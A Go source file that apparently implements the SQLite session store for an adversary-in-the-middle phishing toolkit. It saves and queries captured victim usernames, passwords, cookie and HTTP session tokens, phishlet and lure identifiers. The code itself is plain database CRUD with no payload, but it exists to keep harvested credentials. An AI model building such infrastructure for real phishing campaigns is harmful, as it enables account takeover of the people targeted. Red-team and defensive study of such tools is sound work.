package sqlite

import (
	"database/sql"
	"fmt"
	"strings"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/store"
)

// Compile-time check: Sessions satisfies aitm.SessionStore.
var _ aitm.SessionStore = (*Sessions)(nil)

// Sessions implements aitm.SessionStore backed by SQLite.
type Sessions struct{ db *DB }

func NewSessionStore(db *DB) *Sessions { return &Sessions{db: db} }

func (s *Sessions) CreateSession(session *aitm.Session) error {
	custom, err := marshalJSON(session.Custom)
	if err != nil {
		return err
	}
	cookies, err := marshalJSON(session.CookieTokens)
	if err != nil {
		return err
	}
	body, err := marshalJSON(session.BodyTokens)
	if err != nil {
		return err
	}
	httpTok, err := marshalJSON(session.HTTPTokens)
	if err != nil {
		return err
	}
	var completedAt *int64
	if session.CompletedAt != nil {
		t := session.CompletedAt.Unix()
		completedAt = &t
	}
	_, err = s.db.db.Exec(`
		INSERT INTO sessions
			(id, phishlet, lure_id, remote_addr, user_agent, ja4_hash,
			 bot_score, username, password, custom, cookie_tokens, body_tokens,
			 http_tokens, puppet_id, started_at, completed_at)
		VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
		session.ID, session.Phishlet, session.LureID, session.RemoteAddr, session.UserAgent,
		session.JA4Hash, session.BotScore, session.Username, session.Password,
		custom, cookies, body, httpTok, session.PuppetID,
		session.StartedAt.Unix(), completedAt,
	)
	if isConflict(err) {
		return store.ErrConflict
	}
	return err
}

func (s *Sessions) GetSession(id string) (*aitm.Session, error) {
	row := s.db.db.QueryRow(`SELECT
		id, phishlet, lure_id, remote_addr, user_agent, ja4_hash,
		bot_score, username, password, custom, cookie_tokens, body_tokens,
		http_tokens, puppet_id, started_at, completed_at
		FROM sessions WHERE id = ?`, id)
	sess, err := scanSession(row)
	if err == sql.ErrNoRows {
		return nil, store.ErrNotFound
	}
	return sess, err
}

func (s *Sessions) UpdateSession(session *aitm.Session) error {
	custom, _ := marshalJSON(session.Custom)
	cookies, _ := marshalJSON(session.CookieTokens)
	body, _ := marshalJSON(session.BodyTokens)
	httpTok, _ := marshalJSON(session.HTTPTokens)
	var completedAt *int64
	if session.CompletedAt != nil {
		t := session.CompletedAt.Unix()
		completedAt = &t
	}
	res, err := s.db.db.Exec(`
		UPDATE sessions SET
			phishlet=?, lure_id=?, remote_addr=?, user_agent=?, ja4_hash=?,
			bot_score=?, username=?, password=?, custom=?, cookie_tokens=?,
			body_tokens=?, http_tokens=?, puppet_id=?, started_at=?, completed_at=?
		WHERE id=?`,
		session.Phishlet, session.LureID, session.RemoteAddr, session.UserAgent, session.JA4Hash,
		session.BotScore, session.Username, session.Password,
		custom, cookies, body, httpTok, session.PuppetID,
		session.StartedAt.Unix(), completedAt, session.ID,
	)
	if err != nil {
		return err
	}
	return requireOneRow(res)
}

func (s *Sessions) DeleteSession(id string) error {
	res, err := s.db.db.Exec(`DELETE FROM sessions WHERE id = ?`, id)
	if err != nil {
		return err
	}
	return requireOneRow(res)
}

func (s *Sessions) ListSessions(f aitm.SessionFilter) ([]*aitm.Session, error) {
	if f.CompletedOnly && f.IncompleteOnly {
		return nil, store.ErrInvalidFilter
	}

	var where []string
	var args []any

	if f.Phishlet != "" {
		where = append(where, "phishlet = ?")
		args = append(args, f.Phishlet)
	}
	if f.CompletedOnly {
		where = append(where, "completed_at IS NOT NULL")
	}
	if f.IncompleteOnly {
		where = append(where, "completed_at IS NULL")
	}
	if !f.After.IsZero() {
		where = append(where, "started_at > ?")
		args = append(args, f.After.Unix())
	}
	if !f.Before.IsZero() {
		where = append(where, "started_at < ?")
		args = append(args, f.Before.Unix())
	}

	q := `SELECT id, phishlet, lure_id, remote_addr, user_agent, ja4_hash,
		bot_score, username, password, custom, cookie_tokens, body_tokens,
		http_tokens, puppet_id, started_at, completed_at FROM sessions`
	if len(where) > 0 {
		q += " WHERE " + strings.Join(where, " AND ")
	}
	q += " ORDER BY started_at DESC"
	if f.Limit > 0 {
		q += fmt.Sprintf(" LIMIT %d", f.Limit)
	}
	if f.Offset > 0 {
		q += fmt.Sprintf(" OFFSET %d", f.Offset)
	}

	rows, err := s.db.db.Query(q, args...)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var out []*aitm.Session
	for rows.Next() {
		sess, err := scanSession(rows)
		if err != nil {
			return nil, err
		}
		out = append(out, sess)
	}
	return out, rows.Err()
}

func scanSession(row scanner) (*aitm.Session, error) {
	var (
		session     aitm.Session
		startedAt   int64
		completedAt *int64
		custom      string
		cookies     string
		body        string
		httpTok     string
	)
	err := row.Scan(
		&session.ID, &session.Phishlet, &session.LureID, &session.RemoteAddr, &session.UserAgent,
		&session.JA4Hash, &session.BotScore, &session.Username, &session.Password,
		&custom, &cookies, &body, &httpTok, &session.PuppetID,
		&startedAt, &completedAt,
	)
	if err != nil {
		return nil, err
	}
	session.StartedAt = time.Unix(startedAt, 0)
	if completedAt != nil {
		t := time.Unix(*completedAt, 0)
		session.CompletedAt = &t
	}
	_ = unmarshalJSON(custom, &session.Custom)
	_ = unmarshalJSON(cookies, &session.CookieTokens)
	_ = unmarshalJSON(body, &session.BodyTokens)
	_ = unmarshalJSON(httpTok, &session.HTTPTokens)
	return &session, nil
}
